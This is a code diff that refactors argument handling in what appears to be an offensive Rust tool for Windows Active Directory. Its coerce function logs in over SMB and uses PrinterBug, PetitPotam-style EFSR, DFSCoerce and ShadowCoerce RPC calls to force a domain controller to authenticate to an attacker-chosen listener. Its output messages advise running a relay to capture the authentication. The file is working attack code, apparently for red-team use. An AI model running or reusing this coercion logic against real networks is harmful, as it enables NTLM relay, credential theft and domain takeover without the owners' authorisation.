@@ -26,14 +26,8 @@ pub(crate) enum CoercePipe {
 
 #[derive(Parser)]
 pub(crate) struct CoerceArgs {
-    #[arg(long)]
-    pub host: String,
-    #[arg(long)]
-    pub domain: String,
-    #[arg(long)]
-    pub user: String,
-    #[arg(long)]
-    pub password: String,
+    #[command(flatten)]
+    pub auth: crate::shared_args::SmbAuth,
     /// Attacker host the DC should authenticate to (UNC target)
     #[arg(long)]
     pub listener: String,
@@ -49,19 +43,21 @@ pub(crate) struct CoerceArgs {
 
 /// PetitPotam-style coercion: make the DC authenticate to `--listener` via MS-EFSR.
 pub(crate) async fn coerce(mut a: CoerceArgs) -> Result<()> {
-    a.password = crate::resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
+    a.auth.password = crate::resolve_secret(&a.auth.password, "ADHAMMER_PASSWORD")?;
     use smb2_client::SmbClient;
 
-    let mut smb = SmbClient::connect(&a.host).await?;
-    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
-    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
+    let mut smb = SmbClient::connect(&a.auth.host).await?;
+    smb.login(&a.auth.host, &a.auth.domain, &a.auth.user, &a.auth.password)
+        .await?;
+    smb.tree_connect(&format!("\\\\{}\\IPC$", a.auth.host))
+        .await?;
 
     match a.pipe {
         CoercePipe::Spoolss => {
             // PrinterBug (MS-RPRN): open a printer on the target, then RFFPCNEx → callback to us.
             use dcerpc::rprn::{printerbug_tcp, PrinterBug};
             // Try the \spoolss SMB pipe first; modern spoolers only expose ncacn_ip_tcp (via EPM).
-            let target = a.target.clone().unwrap_or_else(|| a.host.clone());
+            let target = a.target.clone().unwrap_or_else(|| a.auth.host.clone());
             let via_pipe = match smb.open_pipe("spoolss").await {
                 Ok(pipe) => {
                     let mut client = PrinterBug::bind(&mut smb, pipe).await?;
@@ -73,10 +69,10 @@ pub(crate) async fn coerce(mut a: CoerceArgs) -> Result<()> {
                 Some(r) => r,
                 None => {
                     printerbug_tcp(
-                        &a.host,
-                        &a.domain,
-                        &a.user,
-                        &a.password,
+                        &a.auth.host,
+                        &a.auth.domain,
+                        &a.auth.user,
+                        &a.auth.password,
                         &target,
                         &a.listener,
                     )
@@ -86,7 +82,7 @@ pub(crate) async fn coerce(mut a: CoerceArgs) -> Result<()> {
             match result {
                 Ok(status) => {
                     println!("[+] PrinterBug (RFFPCNEx) accepted — status {status:#010x}");
-                    println!("    {} spooler attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
+                    println!("    {} spooler attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.auth.host, a.listener);
                 }
                 Err(e) => {
                     println!(
@@ -99,13 +95,19 @@ pub(crate) async fn coerce(mut a: CoerceArgs) -> Result<()> {
             // MS-DFSNM (DFSCoerce): NetrDfsAddStdRoot over \netdfs — makes the DC auth to ServerName.
             use dcerpc::dfsnm::CoerceClient as DfsClient;
             let pipe = smb.open_pipe("netdfs").await?;
-            let mut client =
-                DfsClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host)
-                    .await?;
+            let mut client = DfsClient::bind_sealed(
+                &mut smb,
+                pipe,
+                &a.auth.domain,
+                &a.auth.user,
+                &a.auth.password,
+                &a.auth.host,
+            )
+            .await?;
             match client.coerce(&a.listener).await {
                 Ok(status) => {
                     println!("[+] NetrDfsAddStdRoot accepted via \\netdfs — status {status:#010x}");
-                    println!("    DC {} attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
+                    println!("    DC {} attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.auth.host, a.listener);
                 }
                 Err(e) => println!(
                     "[-] DFSCoerce failed on this DC ({e}) — try `--pipe spoolss` (PrinterBug); netdfs is picky about transport/auth-level on modern Windows"
@@ -117,13 +119,19 @@ pub(crate) async fn coerce(mut a: CoerceArgs) -> Result<()> {
             // auth to ShareName. Needs the File Server VSS Agent Service enabled.
             use dcerpc::fsrvp::CoerceClient as VssClient;
             let pipe = smb.open_pipe("FssagentRpc").await?;
-            let mut client =
-                VssClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host)
-                    .await?;
+            let mut client = VssClient::bind_sealed(
+                &mut smb,
+                pipe,
+                &a.auth.domain,
+                &a.auth.user,
+                &a.auth.password,
+                &a.auth.host,
+            )
+            .await?;
             match client.coerce(&a.listener).await {
                 Ok(status) => {
                     println!("[+] IsPathSupported accepted via \\FssagentRpc — status {status:#010x}");
-                    println!("    {} VSS provider attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
+                    println!("    {} VSS provider attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.auth.host, a.listener);
                 }
                 Err(e) => println!(
                     "[-] ShadowyCoerce failed ({e}) — needs FS-VSS-Agent role installed AND Backup Operators rights; try `--pipe spoolss` for a reliable alternative"
@@ -139,9 +147,15 @@ pub(crate) async fn coerce(mut a: CoerceArgs) -> Result<()> {
                 _ => unreachable!(),
             };
             let pipe = smb.open_pipe(pipe_name).await?;
-            let mut client =
-                CoerceClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host)
-                    .await?;
+            let mut client = CoerceClient::bind_sealed(
+                &mut smb,
+                pipe,
+                &a.auth.domain,
+                &a.auth.user,
+                &a.auth.password,
+                &a.auth.host,
+            )
+            .await?;
             match client.coerce(&a.listener).await {
                 Ok(status) => {
                     println!(
@@ -149,7 +163,7 @@ pub(crate) async fn coerce(mut a: CoerceArgs) -> Result<()> {
                     );
                     println!(
                         "    DC {} attempted auth to \\\\{}\\... (run a relay/listener to capture)",
-                        a.host, a.listener
+                        a.auth.host, a.listener
                     );
                 }
                 Err(e) => println!(
